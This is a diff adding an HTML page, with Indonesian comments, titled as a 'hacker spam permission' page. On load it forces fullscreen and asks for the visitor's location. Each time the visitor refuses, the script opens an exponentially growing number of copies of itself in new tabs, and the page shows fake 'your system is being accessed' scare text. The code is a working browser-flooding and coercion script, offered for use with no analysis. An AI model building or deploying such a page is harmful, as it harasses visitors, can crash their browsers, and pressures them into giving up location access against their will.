@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Halaman Hacker Spam Permission</title>
+  <style>
+    /* Background gelap dan warna teks hijau neon untuk tampilan hacker */
+    body {
+      background: #000;
+      color: #00FF00;
+      font-family: 'Courier New', Courier, monospace;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* Efek untuk teks */
+    h1, p {
+      text-align: center;
+      font-size: 2rem;
+      text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00;
+    }
+
+    /* Animasi untuk teks */
+    h1 {
+      font-size: 3rem;
+      animation: textGlow 1.5s infinite alternate;
+    }
+
+    @keyframes textGlow {
+      0% {
+        text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00;
+      }
+      100% {
+        text-shadow: 0 0 15px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00;
+      }
+    }
+
+    /* Tombol untuk menambah kesan hacker */
+    button {
+      background-color: #222;
+      color: #00FF00;
+      border: 2px solid #00FF00;
+      padding: 15px 30px;
+      font-size: 1.5rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      cursor: pointer;
+      margin-top: 30px;
+      border-radius: 5px;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #00FF00;
+      color: #222;
+      box-shadow: 0 0 15px #00FF00, 0 0 25px #00FF00;
+    }
+
+    /* Kesan terminal atau console */
+    .console {
+      font-family: 'Courier New', Courier, monospace;
+      color: #00FF00;
+      border: 2px solid #00FF00;
+      padding: 20px;
+      width: 80%;
+      margin-top: 20px;
+      height: 150px;
+      overflow-y: auto;
+      background-color: #222;
+      box-shadow: 0 0 10px #00FF00;
+    }
+
+    .console p {
+      margin: 0;
+      white-space: pre-wrap;
+    }
+  </style>
+  <script>
+    let cancelCount = 0;
+
+    // Fungsi untuk masuk ke mode layar penuh
+    function goFullScreen() {
+      const element = document.documentElement;
+      if (element.requestFullscreen) {
+        element.requestFullscreen();
+      } else if (element.mozRequestFullScreen) { // Firefox
+        element.mozRequestFullScreen();
+      } else if (element.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        element.webkitRequestFullscreen();
+      } else if (element.msRequestFullscreen) { // IE/Edge
+        element.msRequestFullscreen();
+      }
+    }
+
+    // Fungsi untuk terus-menerus meminta izin lokasi
+    function requestLocationPermission() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // Tidak perlu melakukan apa-apa di sini jika berhasil
+            console.log("Lokasi berhasil diambil");
+          },
+          function(error) {
+            console.error("Error permintaan lokasi:", error);
+            // Ketika menolak atau membatalkan, akan membuka tab baru
+            handlePermissionDenied();
+          }
+        );
+      } else {
+        console.log("Geolocation tidak didukung oleh browser ini.");
+      }
+    }
+
+    // Fungsi untuk menangani penolakan izin
+    function handlePermissionDenied() {
+      cancelCount++;
+      let tabCount = Math.pow(10, cancelCount);  // Kelipatan 10 berdasarkan jumlah cancel
+      openNewTabs(tabCount);
+      updateConsole(`Tab baru terbuka: ${tabCount} tab`);
+    }
+
+    // Fungsi untuk membuka tab baru sesuai jumlah yang dihitung
+    function openNewTabs(count) {
+      for (let i = 0; i < count; i++) {
+        window.open(window.location.href, "_blank");
+      }
+    }
+
+    // Fungsi untuk memulai permintaan izin dan fullscreen saat halaman dimuat
+    window.onload = function() {
+      goFullScreen();
+      requestLocationPermission();
+    };
+
+    // Update tampilan console
+    function updateConsole(message) {
+      const consoleDiv = document.querySelector('.console');
+      consoleDiv.innerHTML += message + '\n';
+      consoleDiv.scrollTop = consoleDiv.scrollHeight;  // scroll ke bawah
+    }
+  </script>
+</head>
+<body>
+  <h1>Hacking Mode: Activated</h1>
+  <p>Warning! Your system is being accessed...</p>
+  
+  <button onclick="requestLocationPermission()">Initiate Location Request</button>
+
+  <div class="console">
+    <p>System initializing...</p>
+  </div>
+</body>
+</html>
